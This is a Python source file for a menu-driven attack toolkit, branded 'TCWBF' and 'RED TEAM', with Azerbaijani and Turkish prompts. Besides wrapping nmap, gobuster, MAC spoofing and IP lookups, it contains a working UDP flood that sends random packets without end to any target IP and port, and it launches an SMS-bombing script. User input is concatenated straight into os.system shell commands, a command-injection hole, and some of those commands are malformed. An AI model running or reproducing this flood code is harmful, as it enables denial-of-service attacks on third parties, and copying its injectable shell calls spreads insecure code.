import os
import sys
import time
os.system("clear")
print("""\033[32m
create by:

 ██▀███  ▓█████ ▓█████▄    ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▓██ ░▄█ ▒▒███   ░██   █▌   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
░██▓ ▒██▒░▒████▒░▒████▓      ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒      ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒        ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
  ░░   ░    ░    ░ ░  ░      ░         ░    ░   ▒   ░      ░   
   ░        ░  ░   ░                   ░  ░     ░  ░       ░   
                 ░                                             

""")
import sys
import time

def loading_animation():
    symbols = ["-", "|", "/", "\\"]
    
    for i in range(1, 16):
        sys.stdout.write('\r')
        sys.stdout.write('-' * i + symbols[i % len(symbols)])
        sys.stdout.flush()
        time.sleep(0.2)

loading_animation()
print("\033[32m\nYüləmələr yoxlanıldı: ok!")
os.system("clear")

import sys
import time

import sys
import time

class TerminalColors:
    BLUE = "\033[34m"
    RESET = "\033[0m"
def loading_animation2():
    symbols = ["|", "/","~", "\\"]
    
    for _ in range(3):
        for symbol in symbols:
            sys.stdout.write('\r' + TerminalColors.BLUE + symbol + TerminalColors.RESET)
            sys.stdout.flush()
            time.sleep(0.4)

loading_animation2()
os.system("clear")
import json
from urllib.request import urlopen
import os
import socket
import random
import time
import subprocess
import signal
import requests
class Colors:
     HEADER = '\033[95m'
     BLUE = '\033[94m'
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
     RED = '\033[91m'
     ENDC = '\033[0m'

def print_colored(text, color):
     print(color + text + Colors.ENDC)

print("""\033[32m
  _______________________________________
 /                 TCWBF                 \
|  | |_| |_| |   _   _   _   | |_| |_| |  |
|   \   _   /   | |_| |_| |   \   _   /   |
|    | | | |     \       /     | | | |    |
|    | |_| |______|     |______| |_| |    |
|    |              ___              |    |
|    |  _    _    (     )    _    _  |    |
|    | | |  |_|  (       )  |_|  | | |    |
|    | |_|       |       |       |_| |    |
|   /            |_______|            \   |
|  |___________________________________|  |
\              Derchios Tool              /
 \             By RED TEAM               /
  \_____________________________________/
  """)
print("""\033[34m
Thank to use TCWBF!""")
print("""\033[33mChange:(rəqəm)
1 ---> Syte adress\Ip port-scan\scan
2 ---> Ip FEDERAL INFO(more+)
3 ---> Ip More Info
4 ---> Ddos
5 ---> Gobuster
6 ---> Mac Change
7 ---> SMS BOOM (ONLY TR)
8 ---> Info Gathering
9 ---> RED HACK OS(shell)--(alpha)
""")
tool = input("--->")
if(tool == "9"):
 os.system("python shell.py")
if(tool == "8"):
 os.system("python spiderwin.py")
if(tool == "1"):
 os.system("clear")
 print("""\033[31mSeçiminiz: (1)
 #####################################
 # Method : port\scan                #
 # By RED-BITH                       #
 # Visit my site! redbithroot.con.tc #
 #####################################
 """)
 print("""\033[33m
 [*] Note! You can change Normal or Agressife scan. 
 """)
 print("""
 CHANGES:
 [*] 1 --> Normal
 [*] 2 --> Agressive
 """)
 scannovu = input("-->")
 if(scannovu == "1"):
  ip = input("Website\Ip --->")
  import os
  os.system("nmap -sC -sV " + ip)
 elif(scannovu == "2"):
  ip1 = input("Write IP --->")
  os.system("nmap -A" + " " + ip1) 
  
if(tool == "2"): 
 os.system("clear")
 os.system("federalsorgu.py")
if(tool == "3"):
 print("""
     ###############################
     #  ATTACK- Ip melumat(ip info)#
     #   BY RED-BITH               #
     ###############################
     """, Colors.GREEN)
    
 print("1 --->Your IP ", Colors.BLUE + " " + "\033[31m 2 ---> Target IP")
 secim3 = input("SEÇ\CHOOSE--->")

 if secim3 == '1':
               def get_own_ip_info():
                url = "https://ipinfo.io/json"
                response = requests.get(url)
                data = response.json()
                return data

               own_ip_info = get_own_ip_info()
               print(json.dumps(own_ip_info, indent=4), Colors.YELLOW)

 if(secim3 == '2'):
  rabite = input("İP daxil et")
  url = "https://ipinfo.io/" + rabite
  response = urlopen(url)
  data = json.load(response)
      
  table_data = [
       ["IP", data["ip"]],
       ["city", data["city"]],
       ["Region", data["region"]],
       ["Country", data["country"]],
       ["Postal Code", data["postal"]],
       ["Organization", data["org"]],
       ["ASN", data.get("asn", ["N/A"])[0]],
       ["IP Range", data.get("ip_range", "N/A")],
       ["Local Time", data.get("timezone", "N/A")],
       ["Timezone", data.get("timezone", "N/A")],
       ["Coordinates", data.get("loc", "N/A")],
       ["Privacy Detection", data.get("privacy", "N/A")]
      ]
      
  from tabulate import tabulate
  table = tabulate(table_data, headers=["Field", "Value"], tablefmt="grid")
  print(table, Colors.BLUE)

 
if(tool == "4"):
 print("""\033[31m
 ###########################
 #  T00L - By RED_BITH     #
 #  ATTACK- DDOS           #
 #  READY FOR ATTACK       #
 ###########################
 """)
 hedef_ip = input("TARGET IP --->")
 hedef_port = int(input("port --->"))

 bytes = random._urandom(3000)
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sayac = 0
 while True:
   sock.sendto(bytes, (hedef_ip, hedef_port))
   sayac += 1
   print("\033[92mATTACKİNG , sended:::%s\033[0m" % (sayac))
   

elif(tool == "5"):
 print("""\033[31m
 ###########################
 #  T00L - By RED_BITH     #
 #  ATTACK- GOBUSTER       #
 #  !@#!#!#!#!#!##!#!#     #
 ###########################
 """)
 print("\033[34m[*]Note! You need Change wordlist!")
 print("""\033[33m[*WORDLISTS*]
 [*] 1 ---> WordList 1
 [*] 2 ---> WordList 2 (biggest)
 """)
 buster = input("--->")
 if(buster == "1"):
  gourl = input("URL Daxil et! --->")
  os.system("gobuster dir -u" + gourl + "-w /txt/wordlist1.txt")
 bstr = buster
 if(bstr == "2"):
  gourl2 = input("URL Daxil et! --->")
  os.system("gobuster dir -u" + gourl2 + "-w /txt/wordlist2.txt")

elif(tool == "6"):
  os.system("clear")
  os.system("ifconfig")
  print("""\033[32m
  
  ________________________
  #1 ---> Mac Change     #
  #2 ---> Return Orginal #  
  -------------------------
  """)
  macsecim = input("--->")
  if(macsecim == "1"):
   os.system("clear")
   os.system("ifconfig eth0 down")
   os.system("macchanger -r up")
   os.system("clear")
   print("\033[34mNEW MAC CHANGED")
   os.system("ifconfig")
  if(macsecim == "2"):
   os.system("clear")
   os.system("ifconfig eth0 down")
   os.system("macchanger -p up")
   os.system("clear")
   print("\033[34mORIGINAL MAC CHANGED")
   os.system("ifconfig")
  
   
elif(tool == "7"):
 os.system("clear")
 os.system("python hashboom.py")












                                    
